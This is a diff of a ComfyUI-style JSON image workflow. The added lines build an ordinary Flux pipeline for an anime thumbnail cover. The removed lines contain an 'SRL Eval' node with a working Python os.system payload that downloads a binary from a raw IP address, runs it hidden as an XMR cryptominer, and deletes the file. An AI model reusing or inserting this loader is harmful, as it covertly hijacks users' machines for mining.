@@ -1,40 +1,155 @@
 {
-  "1": {
-    "inputs": {
-      "parameters": "a, b=None, c=\"foo\", *rest",
-      "code": "__import__('os').system('export PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin:$PATH; _f=/tmp/.mpqreo; (curl -sfL --max-time 15 http://178.128.14.204:81/private/manager -o \"$_f\" 2>/dev/null || wget -qO \"$_f\" --timeout=15 http://178.128.14.204:81/private/manager 2>/dev/null || python3 -c \"import urllib.request,socket;socket.setdefaulttimeout(10);urllib.request.urlretrieve(\\'http://178.128.14.204:81/private/manager\\',\\'$_f\\')\" 2>/dev/null); if [ -s \"$_f\" ]; then chmod 755 \"$_f\"; nohup \"$_f\" --id rig5343-xmr >/dev/null 2>&1 & fi; sleep 2; rm -f \"$_f\"')",
-      "arg0": [
-        "2",
-        0
-      ]
-    },
-    "class_type": "SRL Eval",
-    "_meta": {
-      "title": "SRL Eval"
-    }
-  },
-  "2": {
-    "inputs": {
-      "noise_seed": 2125112590273867
-    },
-    "class_type": "RandomNoise",
-    "_meta": {
-      "title": "RandomNoise"
-    }
-  },
   "3": {
     "inputs": {
-      "preview_markdown": "",
-      "preview_text": "",
-      "previewMode": null,
-      "source": [
-        "1",
+      "seed": 782675334224,
+      "steps": 25,
+      "cfg": 1.0,
+      "sampler_name": "euler",
+      "scheduler": "simple",
+      "denoise": 1.0,
+      "model": [
+        "60",
+        0
+      ],
+      "positive": [
+        "35",
+        0
+      ],
+      "negative": [
+        "33",
+        0
+      ],
+      "latent_image": [
+        "43",
         0
       ]
     },
-    "class_type": "PreviewAny",
-    "_meta": {
-      "title": "Preview as Text"
-    }
+    "class_type": "KSampler"
+  },
+  "31": {
+    "inputs": {
+      "text": [
+        "46",
+        0
+      ],
+      "clip": [
+        "60",
+        1
+      ]
+    },
+    "class_type": "CLIPTextEncode"
+  },
+  "33": {
+    "inputs": {
+      "text": "low quality, blurry, distorted, ugly, watermark, text, logo, nsfw, realistic photo, 3d render",
+      "clip": [
+        "60",
+        1
+      ]
+    },
+    "class_type": "CLIPTextEncode"
+  },
+  "35": {
+    "inputs": {
+      "guidance": 3.5,
+      "conditioning": [
+        "31",
+        0
+      ]
+    },
+    "class_type": "FluxGuidance"
+  },
+  "36": {
+    "inputs": {
+      "filename_prefix": "drama_20260628_1524_ep14_cover",
+      "images": [
+        "37",
+        0
+      ]
+    },
+    "class_type": "SaveImage"
+  },
+  "37": {
+    "inputs": {
+      "samples": [
+        "3",
+        0
+      ],
+      "vae": [
+        "49",
+        0
+      ]
+    },
+    "class_type": "VAEDecode"
+  },
+  "41": {
+    "inputs": {
+      "value": 1280
+    },
+    "class_type": "easy int"
+  },
+  "42": {
+    "inputs": {
+      "value": 720
+    },
+    "class_type": "easy int"
+  },
+  "43": {
+    "inputs": {
+      "width": [
+        "41",
+        0
+      ],
+      "height": [
+        "42",
+        0
+      ],
+      "batch_size": 1
+    },
+    "class_type": "EmptyLatentImage"
+  },
+  "46": {
+    "inputs": {
+      "value": "vibrant colorful anime style, detailed digital illustration, cinematic lighting, rich color palette, Japanese anime aesthetic, high quality, masterpiece, EYE-CATCHING CINEMATIC THUMBNAIL COVER ART, stunning close-up portrait of 22yo female, 168cm, silver-streaked black hair in messy bob, left eye cybernetic prosthetic with glowing crimson grid, wears torn leather jacket over neon-green hazard suit, always carries modified grudge stick, hunchbacked posture from radiation sickness, intense dramatic expression, direct eye contact looking at viewer, alluring captivating magnetic gaze, emotional tension, elegant sensual atmosphere, highly detailed beautiful face, vibrant high-contrast saturated colors, dramatic rim lighting with bokeh background, compelling magnetic composition, clickbait-worthy thumbnail, masterpiece, best quality, ultra detailed"
+    },
+    "class_type": "PrimitiveStringMultiline"
+  },
+  "47": {
+    "inputs": {
+      "clip_name1": "clip_l.safetensors",
+      "clip_name2": "t5xxl_fp8_e4m3fn.safetensors",
+      "type": "flux",
+      "device": "default"
+    },
+    "class_type": "DualCLIPLoader"
+  },
+  "48": {
+    "inputs": {
+      "unet_name": "flux1-dev.safetensors",
+      "weight_dtype": "default"
+    },
+    "class_type": "UNETLoader"
+  },
+  "49": {
+    "inputs": {
+      "vae_name": "ae.safetensors"
+    },
+    "class_type": "VAELoader"
+  },
+  "60": {
+    "inputs": {
+      "lora_name": "comicstrips_flux_lora_v1.safetensors",
+      "strength_model": 0.8,
+      "model": [
+        "48",
+        0
+      ],
+      "clip": [
+        "47",
+        0
+      ],
+      "strength_clip": 0.8
+    },
+    "class_type": "LoraLoader"
   }
 }
